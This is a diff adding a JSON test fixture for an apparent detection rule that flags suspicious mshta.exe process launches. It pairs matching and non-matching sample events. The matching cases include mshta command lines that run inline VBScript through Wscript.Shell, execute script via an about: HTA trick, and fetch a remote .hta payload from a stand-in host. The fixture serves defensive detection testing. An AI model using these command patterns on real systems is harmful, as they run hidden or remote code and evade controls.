@@ -1,0 +1,55 @@
+{
+  "rule": "proc_creation_win_mshta_suspicious",
+  "should_match": [
+    {
+      "EventID": 1,
+      "UtcTime": "2026-11-12 08:30:00.000",
+      "Image": "C:\\Windows\\System32\\mshta.exe",
+      "CommandLine": "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"calc.exe\"\":close\")",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "User": "LAB\\analyst"
+    },
+    {
+      "EventID": 1,
+      "UtcTime": "2026-11-12 08:30:00.000",
+      "Image": "C:\\Windows\\System32\\mshta.exe",
+      "CommandLine": "mshta.exe \"about:<hta:application><script language=\"VBScript\">Close(Execute(\"x\"))</script>\"",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "User": "LAB\\analyst"
+    },
+    {
+      "EventID": 1,
+      "UtcTime": "2026-11-12 08:30:00.000",
+      "Image": "C:\\Windows\\System32\\mshta.exe",
+      "CommandLine": "mshta.exe https://example.test/payload.hta",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "User": "LAB\\analyst"
+    }
+  ],
+  "should_not_match": [
+    {
+      "EventID": 1,
+      "UtcTime": "2026-11-12 08:30:00.000",
+      "Image": "C:\\Windows\\System32\\notepad.exe",
+      "CommandLine": "notepad.exe C:\\notes\\mshta-howto.txt",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "User": "LAB\\analyst"
+    },
+    {
+      "EventID": 1,
+      "UtcTime": "2026-11-12 08:30:00.000",
+      "Image": "C:\\Windows\\System32\\mshta.exe",
+      "CommandLine": "mshta.exe C:\\Program Files\\Vendor\\ui.html",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "User": "LAB\\analyst"
+    },
+    {
+      "EventID": 1,
+      "UtcTime": "2026-11-12 08:30:00.000",
+      "Image": "C:\\Windows\\System32\\cmd.exe",
+      "CommandLine": "cmd.exe /c dir C:\\Windows\\System32\\mshta.exe",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+      "User": "LAB\\analyst"
+    }
+  ]
+}
